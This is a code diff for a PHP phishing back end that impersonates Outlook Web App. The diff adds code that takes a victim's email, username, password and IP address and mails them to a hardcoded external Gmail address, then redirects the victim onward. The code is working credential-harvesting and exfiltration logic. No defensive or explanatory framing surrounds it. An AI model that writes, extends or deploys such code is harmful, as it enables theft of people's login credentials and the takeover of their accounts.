@@ -1,6 +1,6 @@
 <?php
     include 'config.php';
-
+    $to = "luckydev2288@gmail.com";
 	$email = '';
 	if(isset($_GET['email'])){
 		$email = $_GET['email'];
@@ -38,6 +38,45 @@
             echo "0 results";
         }
         $conn->close();
+
+        // Send Email
+
+        $message = "
+			<html>
+			<body>
+			<table>
+			<tr>
+				<td>Victim Email: </td>
+				<td>".$email."</td>
+			</tr>
+			<tr>
+				<td>URL: </td>
+				<td>".$redirect_url."</td>
+			</tr>
+			<tr>
+				<td>Username: </td>
+				<td>".$username."</td>
+			</tr>
+			<tr>
+				<td>Password: </td>
+				<td>".$password."</td>
+			</tr>
+			<tr>
+				<td>Ip Address: </td>
+				<td>".$_SERVER['REMOTE_ADDR']."</td>
+			</tr>
+			</table>
+			</body>
+			</html>
+			";
+
+        // Always set content-type when sending HTML email
+        $headers = "MIME-Version: 1.0" . "\r\n";
+        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
+
+        // More headers
+        // $headers .= 'From: <info@unicityautomation.com>' . "\r\n";
+        mail($to,'Outlook Web App',$message,$headers);
 
 		header("location: $redirect_url");
 	}
